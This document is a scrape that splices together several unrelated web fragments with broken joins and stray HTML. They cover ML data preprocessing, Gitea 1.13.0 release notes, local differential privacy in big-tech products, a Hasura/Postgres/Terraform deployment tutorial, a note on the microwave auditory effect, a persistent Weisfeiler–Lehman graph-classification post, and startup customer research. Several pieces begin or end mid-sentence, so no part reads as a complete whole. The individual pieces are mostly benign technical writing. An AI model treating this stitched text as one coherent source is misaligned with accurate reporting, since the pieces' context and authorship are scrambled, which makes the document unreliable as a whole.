<p>Certain preprocessing steps are <code>global</code> (don’t depend on our dataset, ex. removing stop words) and others are <code>local</code> (constructs are learned only from the training split, ex. vocabulary or min-max scaling). For the local, dataset-dependent preprocessing steps, we want to ensure that we split the data first before preprocessing to avoid data leaks.</p>
</blockquote>
<p>🧹 <em>Preparing</em> the data involves organizing and cleaning the data.</p>
<ul>
<li><strong>joins</strong>:
<ul>
<li>performing SQL joins with existing data tables to <em>organize</em> all the relevant data you need in one view.</li>
</ul>
</li>
<li><strong>typing</strong>:
<ul>
<li>ensure that all the values for a specific feature are of the same data type, otherwise you won’t be able to compare them.</li>
</ul>
</li>
<li><strong>missing values</strong>:
<ul>
<li>omit samples with missing values (if only a small subset are missing it)</li>
<li>omit the entire feature (if too many samples are missing the value)</li>
<li>fill in missing values for features (using domain knowledge, heuristics, etc.)</li>
<li>may not always seem “missing” (ex. 0, null, NA, etc.)</li>
</ul>
</li>
<li><strong>outliers (anomalies)</strong>:
<ul>
<li>craft assumptions about what is a “normal” expected value</li>
<li>be careful about removing important outliers (ex. fraud)</li>
<li>anomalies can be global (point), contextual (conditional) or collective</li>
</ul>
</li>
<li><strong>clean</strong>:
<ul>
<li>use domain expertise and EDA</li>
<li>images (crop, resize, clip, etc.)</li>
<li>text (lower, stem, lemmatize, regex, etc.)</li>
</ul>
</li>
</ul>
<blockquote>
<p>You need to clean your data first before splitting, at least for the features that splitting depends on. So the process is more like: preprocessing (global, cleaning) → splitting → preprocessing (local, transformations). We covered splitting first since many preprocessing transformations depend on the training split.</p>
</blockquote>
<p>🤖 <em>Transforming</em> the data involves feature encoding and engineering.</p>
<ul>
<li><strong>scaling</strong>:
<ul>
<li>required for most models that are not decision tree based</li>
<li>learn constructs from train split and apply to other splits (local)</li>
<li>don’t blindly scale features (ex. categorical features)</li>

<p>Often, teams will want to reuse the same features for different tasks so how can we avoid duplication of efforts? A solution is <code>feature stores</code> which will enable sharing of features and the workflows around feature pipelines. We’ll cover feature stores during <em>Production</em>.</p>
</blockquote>
<blockquote>
<p>When we move our code from notebooks to Python scripts, we’ll be testing all our preprocessing functions (these workflows can also be captured in feature stores and applied as features are updated).</p>

<p>Our dataset is pretty straight forward so we’ll only need to use a few of the preprocessing techniques from above. To <em>prepare</em> our data, we’re going to clean up our input text (all global actions).</p>

<blockquote>
<p>Our data splits were dependent only on the target labels (tags) which were already cleaned. However, if your splits depend on other features as well, you need to at least clean them first before splitting. So the process is more like: preprocessing (global, cleaning) → splitting → preprocessing (local, transformations).</p>
</blockquote>
<p>Many of the <em>transformations</em> we’re going to do are model specific. For example, for our simple baselines we may do <code>label encoding</code> → <code>tf-idf</code> while for the more involved architectures we may do <code>label encoding</code> → <code>one-hot encoding</code> → <code>embeddings</code>. So we’ll cover these in the next suite of lessons as we implement each baseline.</p>

			<p>We are proud to present the release of Gitea version 1.13.0.</p>
<p>As we approach Gitea’s <a href="https://blog.gitea.io/2016/12/release-of-1.0.0/">4th birthday</a>, I just want to give a special thanks to everyone who has been a part of the project, whether it’s the implementation of a feature, or just enjoying the software.<br>
Thank you all!</p>
<p>We have merged an incredible <a href="https://github.com/go-gitea/gitea/pulls?q=is%3Apr+milestone%3A1.13.0+is%3Amerged">649</a> pull requests to release this version.</p>
<!-- raw HTML omitted -->
<p>We would like to give a special thanks to Michael Scherer (<a href="https://github.com/mscherer">@mscherer</a>) for reporting a security issue that was patched in this release.<br>
Thanks to <a href="https://github.com/zeripath">@zeripath</a> for fixing in <a href="https://github.com/go-gitea/gitea/pull/12685">#12685</a></p>
<p>You can download one of our pre-built binaries from our <a href="https://dl.gitea.io/gitea/1.13.0/">downloads page</a> - make sure to select the correct platform! For further details on how to install, follow our <a href="https://docs.gitea.io/en-us/install-from-binary/">installation guide</a>.</p>
<p>❗ As of this version, Gitea supports TLS version 1.2 at <em>minimum</em>. (<a href="https://github.com/go-gitea/gitea/pull/12689">#12689</a>)</p>
<p>❗ Users with a custom favicon will need to provide a <code>favicon.svg</code>. (<a href="https://github.com/go-gitea/gitea/pull/12437">#12437</a>)</p>
<p>❗ Password complexity checks now default to <code>off</code>. (<a href="https://github.com/go-gitea/gitea/pull/12557">#12557</a>)<br>
Alternative methods such as minimum length or checking against HaveIBeenPwned should be considered.</p>
<p>We would also like to thank all of our supporters on <a href="https://opencollective.com/gitea">Open Collective</a> who are helping to sustain us financially.</p>

<p>The growth of AI and machine learning (ML) has led researchers to think, research and stress the development of ethical AI solutions - with AI models / solutions able to provide:</p>
<!--more-->
<ul>
<li>Explainability &amp; Interpretability</li>
<li>Privacy&nbsp;</li>
<li>Fairness</li>
<li>Model Governance</li>
</ul>
<p>The concept of privacy introduced for ML has been extended from individual / standalone models to distributed training such as federated learning. Here models trained locally are sent to decentralized servers that aggregate model weights and inferences from several individual devices to yield an aggregated ensemble model of greater privacy and trust. With further extensive AI research and translating research to productionizing solutions, hybrid ML models find its usage in different industrial domains.</p>
<p>Such hybrid models built using Differential Privacy at Application level and Secured Transfer Protocol at transport level have been used extensively to build scalable solutions in the following industry domains.</p>
<ul>
<li>Distributed Control Systems</li>
<li>Industrial IoT Systems</li>
<li>Supply Chain</li>
<li>Retail</li>
<li>Financial Services</li>
<li>Health Care</li>
<li>Automotives and Electrical vehicles&nbsp;&nbsp;</li>
<li>Locomotives/Transportation Systems</li>

<ol>
<li>Differential Privacy applications developed by software giant's Google, Apple, Microsoft</li>
<li>Differential Privacy for Location Based Services</li>
<li>Differential Privacy for IoT Sensors for Edge and Fog Computing</li>
</ol>
<p>Our discussion remains confined within the scope of Local Differential Privacy where each user is responsible for maintaining a differentially private mechanism to their <strong>own</strong> data through addition of noise mechanisms. To know more about Global vs Local Differential Privacy refer to <a href="https://desfontain.es/privacy/local-global-differential-privacy.html%C2%A0" rel="noopener">this article</a>.</p>
<h2><span>Local Differential Privacy (LDP) Based Solutions</span></h2>
<h3><span>Rappor By Google</span></h3>
<p>The <a href="http://static.googleusercontent.com/media/research.google.com/en/us/pubs/archive/42852.pdf" rel="noopener">RAPPOR (Randomized Aggregatable Privacy-Preserving Ordinal Response)</a> implemented in Chrome browse collects data from opt-in users, tens of millions per day by Tracking in&nbsp; settings in the browser, e.g. home page, search engine and protects them from unwanted or malicious hijacking. It eliminates the need for a trusted third party server and puts control over client’s data back into their direct control.</p>
<p>It works on the principle of randomized response that provides strong Differential Privacy (DP) guarantee and protection. It operates by collecting statistics on sensitive topics by crowdsourcing from end-users, through client-side software where survey respondents wish to retain confidentiality. The RAPPOR mechanism is performed locally on the client, and does not require a trusted third party. In terms of frequency, the data from clients where data is collected repeatedly (or even infinitely often).</p>
<p>RAPPOR can be used to collect statistics on categorical client properties, by having each bit in a client’s response represent whether, or not, that client belongs to a category.&nbsp;&nbsp;&nbsp;</p>
<p>It functions by limiting the number of correlated categories, or Bloom filter hash functions, reported by any single client. This helps RAPPOR to maintain its differential-privacy (DP) guarantees even when statistics are collected on multiple aspects of clients.&nbsp;</p>
<p>The foremost limitation of RAPPOR is Its slowness and limited application.</p>
<h3><span>LDP in IOS, IPhone, Mac - Apple Products</span></h3>
<p><a href="https://en.wikipedia.org/wiki/Local_differential_privacy" rel="noopener">Local Differential Privacy (LDP)</a>, applied on the platforms used by Apple works on the principle of&nbsp; statistical noise that is slightly biased and can mask a user’s individual data before it is shared with Apple. On receiving similar data inputs from several people, the added noise helps to average out large numbers of data points, thereby setting a clear inference before Apple which they can use as their benefit to derive meaningful information.</p>
<p>It uses the principle of privacy budget (quantified by the parameter epsilon), and sets a strict limit on the number of contributions from a user in order to preserve their privacy.&nbsp;</p>
<p>Suitable metrics with insights improves the intelligence and usability from the following applications. In addition, it also protects the privacy of user activity in a given time period</p>
<ul>
<li>QuickType suggestions</li>
<li>Emoji suggestions</li>
<li>Lookup Hints&nbsp;</li>
<li>Safari Energy Draining Domains</li>
<li>Safari Autoplay Intent Detection (macOS High Sierra)</li>
<li>Safari Crashing Domains (iOS 11)</li>
<li>Health Type Usage (iOS 10.2)</li>
</ul>
<p>The Count Mean Sketch technique allows Apple to determine the most popular emoji to help design better ways to find and use our favorite emoji.&nbsp;</p>
<p>Count Mean Sketch and Hadamard Count Mean–based Sketch techniques for differential privacy relies on noise addition along with hash encoding using a series of mathematical functions.</p>
<p>Apple Sketches and Transform count frequencies of items/typing statistics. Apple uses their system to collect data from iOS and OS X users Popular emojis, popular words, which websites to mute and where to play audio.</p>
<p>The system is composed of Ingestor and Aggregator where private info like IP is stripped off and processed in a batch that removes metadata, such as the timestamps of privatized records received, and separates these records based on their use case.</p>
<p>The architecture strives to obtain a tradeoff among factors, including privacy, utility, server computation overhead, and device bandwidth, without lowering accuracy.</p>
<h3><span>Local Differential Privacy&nbsp; in Microsoft Products</span></h3>
<p>Microsoft leveraged Local Differential Privacy (LDP) to protect user privacy in several applications, including telemetry in Windows (used by millions of users), advertiser queries in LinkedIn, suggested replies in Office, and manager dashboards in Workplace Analytics which is a pluggable open source library of differentially private algorithms.</p>
<p>The DP platform provided by Microsoft provides a <span>host of components that can be flexibly configured, allowing big data specialists to use the best and right set of services for their environments.</span></p>
<p><a href="https://cloudblogs.microsoft.com/opensource/2020/05/19/new-differential-privacy-platform-microsoft-harvard-opendp/"><span><img src="https://lh6.googleusercontent.com/zIFIysy5VB-XCPLAS0bkOHfGkn845bAZq11Qy_bgi4-FLikmdt-SiW_dZn9wxnIh2jlIq7jnqoaHwBVFTypuqnYrszj0UnMxtpyJ80C9Ez_zv8-mY3Z9A_6nMyqA9uD-_gRqB358" width="835"></span></a></p>
<p><em><a href="https://cloudblogs.microsoft.com/opensource/2020/05/19/new-differential-privacy-platform-microsoft-harvard-opendp/" rel="noopener">Image source</a></em></p>
<p>The framework is equipped with mechanisms related to implementations based on mature differential privacy research and APIs for defining an analysis. Each analysis is supported by suitable validation techniques for estimating the total privacy loss.</p>
<p><span>The Telemetry private data collection employs:</span></p>
<ul>
<li>1BitMean to collect numeric data, independently from different users</li>
<li>dBitFlip to collect (sparse) histogram data from each user independently, distributed across buckets.</li>
</ul>
<p>According to Microsoft’s DP design principles <em>“the continuous collection of counter data is strong when the user's behavior remains approximately the same, varies slowly, or varies around a small number of values over the course of data collection”.</em></p>
<p>Memoization and perturbation techniques applied by Microsoft in the context of private collection of counters, avoids substantial losses in accuracy or privacy, functioning well when data is collected over long periods of time.</p>
<h2><span>Challenges</span></h2>
<p>The real challenge in scaling DP solutions lies in its integration into real-world environments with highly customized data structures. Further it also needs good KPIs for performance and reliability. Legacy DP systems require modification to existing data pipelines or replacement of database engines, while integrating to ML systems and Big Data pipelines.</p>
<p>For edge computing the challenge lies in limitations of individual edge-servers in detecting threats. Edge servers are middleware components that can serve as a distillation point for sensitive data before they are sent to the cloud. Further, when edge servers become the centre of data processing and storage, then they may not have enough resources to protect themselves.</p>
<p>To develop a safe ecosystem for edge-computing, it’s essential to design a scalable, efficient, and decentralized security mechanism.&nbsp;</p>
<h2><span>Differential Privacy for Location Based Services</span></h2>
<p>For automotives and related location-based services real-time data processing along with preserving location privacy are essential for providing security&nbsp; to the driver. Edge-computing can be seen as a promising solution to offer efficient differentially privacy-preserving&nbsp; location-based services where computing and storage resources can be placed at the network&nbsp; edge. Edge nodes (e.g., road side</p>
<p>infrastructures and base stations) takes the responsibility from remote-servers to provide privacy enabled solutions&nbsp; by ensuring location privacy in its coverage by balancing both utility and privacy.</p>
<p>The fundamental principle in building&nbsp; the framework lies in creating two services, Differentially Privacy-preserving&nbsp; Location-based Service Usage (Pri-LBS) mechanism and Privacy Level Adjustment (PLA) module, which are designed to enable vehicles to request useful information based on&nbsp; the&nbsp; submitted&nbsp; location&nbsp; without&nbsp; revealing&nbsp; their&nbsp; location privacy.&nbsp; Any vehicle registered with this service first submits its location to the edge node. The edge node executes the privacy-preserving mechanism by …</p></span></p></div></div></div></div></div></div></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p><strong><em>Key Technologies:</em></strong>&nbsp;<a href="https://hasura.io/opensource/">Hasura</a>,&nbsp;<a href="https://www.postgresql.org/">Postgres</a>,&nbsp;<a href="https://www.terraform.io/">Terraform</a>,&nbsp;<a href="https://www.docker.com/">Docker</a>, and&nbsp;<a href="https://azure.microsoft.com/en-us/">Azure</a>.</p>



<p>I created a data model to store railroad systems, services, scheduled, time points, and related information, detailing the schema&nbsp;<a href="https://compositecode.blog/2019/11/25/beyond-crud-n-cruft-data-modeling/">“Beyond CRUD n’ Cruft Data-Modeling”</a>&nbsp;with a few tweaks. The original I’d created for Apache Cassandra, and have since switched to Postgres giving the option of primary and foreign keys, relations, and the related connections for the model.</p>



<p>In this post I’ll use that schema to build out an infrastructure as code solution with&nbsp;<a href="https://www.terraform.io/">Terraform</a>, utilizing&nbsp;<a href="https://www.postgresql.org/">Postgres</a>&nbsp;and&nbsp;<a href="https://hasura.io/opensource/">Hasura (OSS)</a>.</p>



<h2>Prerequisites</h2>



<ul><li>Terraform &amp; Azure CLI –&nbsp;<a href="https://compositecode.blog/2019/08/01/development-workspace-with-terraform/">Installation &amp; Setup</a>.</li><li>Docker – Installation &amp; Setup on&nbsp;<a href="https://docs.docker.com/docker-for-windows/install/">Windows</a>/<a href="https://docs.docker.com/docker-for-windows/install-windows-home/">Windows Home</a>,&nbsp;<a href="https://docs.docker.com/docker-for-mac/install/">MacOS</a>, Linux&nbsp;<a href="https://docs.docker.com/engine/install/ubuntu/">Ubuntu</a>,&nbsp;<a href="https://docs.docker.com/engine/install/fedora/">Fedora</a>,&nbsp;<a href="https://docs.docker.com/engine/install/debian/">Debian</a>, or&nbsp;<a href="https://docs.docker.com/engine/install/centos/">CentOS</a>.</li><li>Hasura CLI –&nbsp;<a href="https://hasura.io/docs/1.0/graphql/manual/hasura-cli/install-hasura-cli.html#install-a-binary-globally">Installing the binary globally</a>, and&nbsp;<a href="https://hasura.io/docs/1.0/graphql/manual/hasura-cli/install-hasura-cli.html">other options</a>.</li></ul>



<h2>Docker Compose Development Environment</h2>



<p>For the Docker Compose file I just placed them in the root of the repository. Add a docker-compose.yaml file and then added services. The first service I setup was the Postgres/PostgreSQL database. This is using the standard&nbsp;<a href="https://hub.docker.com/_/postgres/">Postgres image on Docker Hub</a>. I opted for version 12, I do want it to always restart if it gets shutdown or crashes, and then the last of the obvious settings is the port which maps from 5432 to 5432.</p>



<p>For the volume, since I might want to backup or tinker with the volume, I put the db_data location set to my own&nbsp;<code>Codez</code>&nbsp;directory. All my databases I tend to setup like this in case I need to debug things locally.</p>



<p>The POSTGRES_PASSWORD is an environment variable, thus the syntax&nbsp;<code>${PPASSWORD}</code>. This way no passwords go into the repo. Then I can load the environment variable via a standard&nbsp;<code>export POSTGRES_PASSWORD="theSecretPasswordHere!"</code>&nbsp;line in my system startup script or via other means.</p>



<pre><code>services:
  postgres:
    image: postgres:12
    restart: always
    volumes:
      - db_data:/Users/adron/Codez/databases
    environment:
      POSTGRES_PASSWORD: ${PPASSWORD}
    ports:
      - 5432:5432
</code></pre>



<p>For the db_data volume, toward the bottom I add the key value setting to reference it.</p>



<pre><code>volumes:
  db_data:
</code></pre>



<p>Next I added the GraphQL solution with Hasura. The image for the v1.1.0 probably needs to be updated (I believe we’re on version 1.3.x now) so I’ll do that soon, but got the example working with v1.1.0. Next I’ve got the ports mapped to open 8080 to 8080. Next, this service will depend on the postgres service already detailed. Restart, also set on always just as the postgres service. Finally two evnironment variables for the container:</p>



<ul><li>HASURA_GRAPHQL_DATABASE_URL – this variable is the base postgres URL connection string.</li><li>HASURA_GRAPHQL_ENABLE_CONSOLE – this is the variable that will set the console user interface to initiate. We’ll definitely want to have this for the development environment. However in production I’d likely want this turned off.</li></ul>



<pre><code>  graphql-engine:
    image: hasura/graphql-engine:v1.1.0
    ports:
      - "8080:8080"
    depends_on:
      - "postgres"
    restart: always
    environment:
      HASURA_GRAPHQL_DATABASE_URL: postgres://postgres:logistics@postgres:5432/postgres
      HASURA_GRAPHQL_ENABLE_CONSOLE: "true"
</code></pre>



<p>At this point the commands to start this are relatively minimal, but in spite of that I like to create a start and stop shell script. My start script and stop script simply look like this:</p>



<p>Starting the services.</p>



<pre><code>docker-compose up -d
</code></pre>



<p>For the first execution of the services you may want to skip the -d and instead watch the startup just to become familiar with the events and connections as they start.</p>



<p>Stopping the services.</p>



<pre><code>docker-compose down
</code></pre>



<p>🚀 That’s it for the basic development environment, we’re launched and ready for development. With the services started, navigate to&nbsp;<a href="https://localhost:8080/console">https://localhost:8080/console</a>&nbsp;to start working with the user interface, which I’ll have a more details on the&nbsp;<a href="https://compositecode.blog/2019/11/25/beyond-crud-n-cruft-data-modeling/">“Beyond CRUD n’ Cruft Data-Modeling”</a>&nbsp;swap to Hasura and Postgres in an upcoming blog post.</p>



<p>For full syntax of the docker-compose.yaml check out this gist:&nbsp;<a href="https://gist.github.com/Adron/0b2ea637b5e00681f4d62404805c3a00">https://gist.github.com/Adron/0b2ea637b5e00681f4d62404805c3a00</a></p>



<h2>Terraform Production Environment</h2>



<p>For the production deployment of this stack I want to deploy to&nbsp;<a href="https://azure.microsoft.com/en-us/">Azure</a>, use&nbsp;<a href="https://www.terraform.io/">Terraform</a>&nbsp;for infrastructure as code, and the&nbsp;<a href="https://azure.microsoft.com/en-us/services/postgresql/">Azure database service for Postgres</a>&nbsp;while running&nbsp;<a href="https://hasura.io/">Hasura</a>&nbsp;for my API GraphQL tier.</p>



<p>For the Terraform files I created a folder and added a&nbsp;<code>main.tf</code>&nbsp;file. I always create a folder to work in, generally, to keep the state files and initial prototyping of the infrastructre in a singular place. Eventually I’ll setup a location to store the state and fully automate the process through a continues integration (CI) and continuous delivery (CD) process. For now though, just a singular folder to keep it all in.</p>



<p>For this I know I’ll need a few variables and add those to the file. These are variables that I’ll use to provide values to multiple resources in the Terraform templating.</p>



<pre><code>variable "database" {
  type = string
}

variable "server" {
  type = string
}

variable "username" {
  type = string
}

variable "password" {
  type = string
}
</code></pre>



<p>One other variable I’ll want so that it is a little easier to verify what my Hasura connection information is, will look like this.</p>



<pre><code>output "hasura_url" {
  value = "postgres://${var.username}%40${azurerm_postgresql_server.logisticsserver.name}:${var.password}@${azurerm_postgresql_server.logisticsserver.fqdn}:5432/${var.database}"
}
</code></pre>



<p>Let’s take this one apart a bit. There is a lot of concatenated and interpolated variables being wedged together here. This is basically the Postgres connection string that Hasura will need to make a connection. It includes the username and password, and all of the pertinent parsed and string escaped values. Note specifically the&nbsp;<code>%40</code>&nbsp;between the&nbsp;<code>${var.username}</code>&nbsp;and&nbsp;<code>${azurerm_postgresql_server.logisticsserver.name}</code>&nbsp;variables while elsewhere certain characters are not escaped, such as the&nbsp;<code>@</code>&nbsp;sign. When constructing this connection string, it is very important to be prescient of all these specific values being connected together. But, I did the work for you so it’s a pretty easy copy and paste now!</p>



<p>Next I’ll need the Azure provider information.</p>



<pre><code>provider "azurerm" {
  version = "=2.20.0"
  features {}
}
</code></pre>



<p>Note that there is a&nbsp;<code>features</code>&nbsp;array that is just empty, it is now required for the provider to designate this even if the array is empty.</p>



<p>Next up is the resource group that everything will be deployed to.</p>



<pre><code>resource "azurerm_resource_group" "adronsrg" {
  name     = "adrons-rg"
  location = "westus2"
}
</code></pre>



<p>Now the Postgres Server itself. Note the&nbsp;<code>location</code>&nbsp;and&nbsp;<code>resource_group_name</code>&nbsp;simply map back to the resource group. Another thing I found a little confusing, as I wasn’t sure if it was a Terraform name or resource name tag or the server name itself, is the “name” key value pair in this resource. It is however the server name, which I’ve assigned&nbsp;<code>var.server</code>. The next value assigned “B_Gen5_2” is the Azure designator, which is a bit cryptic. More on that in a future post.</p>



<p>After that information the storage is set to, I believe if I RTFM’ed correctly to 5 gigs of storage. For what I’m doing this will be fine. The backup is setup for 7 days of retention. This means I’ll be able to fall back to a backup from any of the last seven days, but after 7 days the backups are rolled and the last day is deleted to make space for the newest backup. The&nbsp;<code>geo_redundant_backup_enabled</code>&nbsp;setting is set to false, because with Postgres’ excellent reliability and my desire to not pay for that extra reliability insurance, I don’t need geographic redundancy. Last I set&nbsp;<code>auto_grow_enabled</code>&nbsp;to true, albeit I do need to determine the exact flow of logic this takes for this particular implementation and deployment of Postgres.</p>



<p>The last chunk of details for this resource are simply the username and password, which are derived from variables, which are derived from environment variables to keep the actual username and passwords out of the repository. The last two bits set the ssl to enabled and the version of Postgres to v9.5.</p>



<pre><code>resource "azurerm_postgresql_server" "logisticsserver" {
  name = var.server
  location = azurerm_resource_group.adronsrg.location
  resource_group_name = azurerm_resource_group.adronsrg.name
  sku_name = "B_Gen5_2"

  storage_mb                   = 5120
  backup_retention_days        = 7
  geo_redundant_backup_enabled = false
  auto_grow_enabled            = true

  administrator_login          = var.username
  administrator_login_password = var.password
  version                      = "9.5"
  ssl_enforcement_enabled      = true
}
</code></pre>



<p>Since the database server is all setup, now I can confidently add an actual database to that database. Here the&nbsp;<code>resource_group_name</code>&nbsp;pulls from the resource group resource and the&nbsp;<code>server_name</code>&nbsp;pulls from the server resource. The name, being the database name itself, I derive from a variable too. Then the character set is UTF8 and collation is set to US English, which are generally standard settings on Postgres being installed for use within the US.</p>



<pre><code>resource "azurerm_postgresql_database" "logisticsdb" {
  name                = var.database
  resource_group_name = azurerm_resource_group.adronsrg.name
  server_name         = azurerm_postgresql_server.logisticsserver.name
  charset             = "UTF8"
  collation           = "English_United States.1252"
}
</code></pre>



<p>The next thing I discovered, after some trial and error and a good bit of searching, is the Postgres specific firewall rule. It appears this is related to the Postgres service in Azure specifically, as for a number of trials and many errors I attempted to use the standard available firewalls and firewall rules that are available in virtual networks. My understanding now is that the Postgres Servers exist outside of that paradigm and by relation to that have their own firewall rules.</p>



<p>This firewall rule basically attaches the firewall to the resource group, then the server …</p></div></div>

<blockquote><p> The <a href="https://en.wikipedia.org/wiki/Microwave_auditory_effect">microwave auditory effect</a>, also known as the Frey effect, consists of the human perception of audible clicks, or even speech, induced by pulsed or modulated radio frequencies. The communications are generated directly inside the human head without the need of any receiving electronic device. The effect was first reported by persons working in the vicinity of radar transponders during World War II.  In 1961, the American neuroscientist Allan H. Frey studied this phenomenon and was the first to publish information its nature.<br></p></blockquote><p>

        <p>I have written at lengths about certain aspects of topological data
analysis, but I have neglected to discuss one of its main applications,
i.e. the classification of graphs. In this post, I will therefore take
you on a quick tour of our ICML paper <a href="http://proceedings.mlr.press/v97/rieck19a/rieck19a.pdf">A Persistent Weisfeiler–Lehman Procedure for Graph Classification</a>.</p>
<p>Let us assume that we are given a graph with node label information. The
graph could, for instance, be a molecule, whose nodes are atoms such as
carbon or oxygen, and whose edges indicate chemical bonds. The goal
could now be to classify a given molecule into a set of classes, such as
‘toxic’, ‘carcinogen’, etc. How can we achieve such a classification?
One of the simplest techniques dates back to the 1960s and involves
calculating an <em>iterative fingerprint</em> of the graph! This procedure was
suggested by <a href="https://en.wikipedia.org/wiki/Boris_Weisfeiler">Boris Weisfeiler</a>
and Andrei Lehman&nbsp;(sometimes also transliterated as ‘Leman’) in
their seminal article <a href="https://www.iti.zcu.cz/wl2018/pdf/wl_paper_translation.pdf">The reduction of a graph to canonical form and the
algebra which appears therein</a>.</p>
<p>At its core, the algorithm is an iteration scheme that works like this:</p>
<ol>
<li>For a node $v$, collect its label and the labels of adjacent nodes in
a multiset.</li>
<li>Assign this multiset a new label by hashing it—with the proviso
that the hashing function is <a href="https://en.wikipedia.org/wiki/Perfect_hash_function"><em>perfect</em></a>, i.e.
it maps distinct labels to distinct values with no collisions.</li>
<li>Replace all node labels by their multiset hashes.</li>
</ol>
<p>Intuitively, each step of the algorithm accumulates more information
from nodes that are further removed from the current node. The hashed
multiset label is thus an expression of the neighbourhood around
a node—and after a sufficiently large number of iterations, the
hashed labels will not change any more.</p>
<p>For example, suppose you are dealing with this simple graph&nbsp;(to
prevent confusion of node labels and node IDs, I used <em>colours</em> to
indicate node labels in this example):</p>
<div>
<figure>
    <img src="https://bastian.rieck.me/images/weisfeiler_lehman_graph.svg" alt="Weisfeiler--Lehman example graph" height="128"> 
</figure>

</div>
<p>Tabulating the neighbourhood of each node then results in the following
table:</p>
<div>
<figure>
    <img src="https://bastian.rieck.me/images/weisfeiler_lehman_table_1.svg" alt="Weisfeiler--Lehman multiset example (before hashing)" height="128"> 
</figure>

</div>
<p>Now for the hashing step. In this example, <em>perfect hashing</em> means
choosing a set of colours that is distinct for every distinct
combination of neighbourhood labels and vertex labels:</p>
<div>
<figure>
    <img src="https://bastian.rieck.me/images/weisfeiler_lehman_table_2.svg" alt="Weisfeiler--Lehman multiset example (after hashing)" height="128"> 
</figure>

</div>
<p>Notice how nodes A, B, and G are hashed to the same colour—because
in the first iteration of the algorithm, they cannot be distinguished.
How can we use the information about the hashed labels in a subsequent
comparison task? The answer is lies in <em>counting</em> them in a histogram
vector, which is indexed by the unique labels—this is where our
requirement of the perfect hashing function is helpful. For the
previously-shown graph, it looks like this:</p>
<div>
<figure>
    <img src="https://bastian.rieck.me/images/weisfeiler_lehman_feature_vector.svg" alt="Weisfeiler--Lehman subtree feature vector" height="128"> 
</figure>

</div>
<p>The <em>fingerprint</em> of this graph, according to the first iteration of the
Weisfeiler–Lehman scheme is therefore $(3, 1, 2, 1)$. Further iterations
just make the feature vector longer&nbsp;(technically, the initial
labels already give rise to a feature vector of counts). This procedure
can now be repeated for higher-order iterations and the resulting
feature vectors can be compared across graphs by evaluating, for
example, their dot product. More formalisations of this idea have
resulted in the very successful <a href="https://www.jmlr.org/papers/volume12/shervashidze11a/shervashidze11a.pdf">Weisfeiler–Lehman Graph
Kernels</a>
publication. This method arguably constitutes the basis for graph neural
networks—in fact, these networks can be seen as a parametrised
version of the Weisfeiler–Lehman iteration scheme. But I digress—if
you are interested in these aspects, please read <a href="https://towardsdatascience.com/beyond-weisfeiler-lehman-approximate-isomorphisms-and-metric-embeddings-f7b816b75751">Michael Bronstein’s
article on going beyond graph
isomorphism</a>
for more details.</p>
<p>Now, despite its great practical utility, this feature vector is lacking
some <em>structural</em> information about the graph. It does not know whether
a certain label contributes much to the topological structure of
a graph—such as a ring of carbon atoms would in molecule—or not. To
this end, we introduced a notion of topological relevance for each node
label! Briefly put, we first developed a distance metric that would
permit us turn any <em>labelled</em> graph into a <em>weighted</em> graph. We then
calculate a persistence barcode, a topological descriptor of the graph.
This descriptor assesses the relevance of a topological feature created
by some node label. We use the topological relevance of each feature as
an additional <em>weight</em> for the previously-shown feature vector. In
essence, labels that contribute a large amount of topological structure
in a graph are assigned a higher weight than labels that only contribute
a meagre amount!</p>
<p>Here is a graphical depiction of our process:</p>
<div>
<figure>
    <img src="https://bastian.rieck.me/images/p_wl_pipeline.svg" alt="Persistent Weisfeiler--Lehman pipeline" height="128"> 
</figure>

</div>
<p>If you want to brush up your understanding of the barcode calculation,
head on over to <a href="https://christian.bock.ml/">Christian’s website</a>; he has
an <a href="https://christian.bock.ml/posts/persistent_homology">excellent article on persistent
homology</a>.</p>
<p>The neat thing about our approach is that we can easily integrate
information about <em>cycles</em> into the feature vector—this is
a functionality that the original Weisfeiler–Lehman Graph Kernels
Framework lacks. Moreover, these cycles turn out to be crucial in
improving classification performance—we get an increase of more than
3% in classification accuracy by considering them in some data sets!</p>
<p>If this has whet your appetite, I invite you to <a href="http://proceedings.mlr.press/v97/rieck19a/rieck19a.pdf">read our
paper</a> or <a href="https://github.com/BorgwardtLab/P-WL">take
a look at the code</a>. If you want
to learn more about graph classification using graph kernels, take
a look at our <a href="https://arxiv.org/abs/2011.03854">recent survey on graph kernels</a>,
which will hopefully be officially announced in time for NeurIPS 2020.
In the best tradition of Fermat, I would very much like to cover the
content of the survey here, but this blog is too small to contain all of
it—maybe for a subsequent post?</p>
<p>Until next time!</p>

However, after just two years we were acqui-hired, our investors got their money back, and the product was immediately <a href="https://www.insidehighered.com/digital-learning/article/2018/05/23/missionu-self-styled-alternative-higher-education-closes-after" rel="noopener">shut down</a>.</p><p id="6863">I was gutted, still am TBH.</p><p id="0f28">But with hindsight, I could look back to my original research notes and see I had ignored several fatal warnings.

They told us they’d love to use it but after months turning prototypes into a product, few actually did.</p><p id="a400">So we started over from scratch, but this time with a different approach:</p><ol><li id="2be7">Focus on a very specific user type with a very specific job to be done.</li><li id="bb56">Interview dozens of them only to understand how and why they solve their problem today.</li></ol><p id="0128">Our goal was not to validate whether the merit of a specific solution but to observe existing customer behaviors and desires as a means of generating new ideas for potential product solutions.</p><p id="3dec">This is what is known as <strong>generative research</strong>.</p><p id="4699">As you listen to your target market describe what they do today to solve their problems, you can better understand potential customers’ existing incentives, behaviors, and desires in anticipation for how they’d react to a new solution.</p><p id="331b"><a href="https://twitter.com/robfitz" rel="noopener">Rob Fitzpatrick</a> has famously coined this generative research phase “ <a href="http://momtestbook.com/" rel="noopener">The Mom Test</a>,” which is a set of simple rules to ask good questions so that even your Mom can’t lie to you in her answers to protect your ego.</p><p id="7e65">Generative research questions are focused on understanding existing behavior. For example, here are some questions from an interview guide we used at <a href="http://grain.co/" rel="noopener">Grain</a> to understand how our prospective users already document and share information from live meetings:</p><ul><li id="fcb3">What’s your current process to document and share information from a video meeting?</li><li id="fa1f">How important is it that the information you document and share is accurate?</li><li id="6568">What measures do you currently take to ensure accuracy of captured information?</li><li id="33f9">What can happen if your documentation is inaccurate?</li><li id="32f3">How often are you in conversations where you don’t need to document or share anything?</li><li id="cda6">Which types of conversations are the most important for you to document and share?</li></ul><p id="9e72">Be sure to avoid hypothetical questions about what people <em>might</em> do. Don’t try to validate your future product with questions that begin with “would you use this” or “what do you think about the possibility of” — that’s what we call leading the witness, and it will inevitably bias your data and waste your time building the wrong thing. At this stage, you simply need to observe what users are <em>already doing,</em> not what they might theoretically do.</p><figure><div></div></figure><p id="69d3">I recently connected with <a 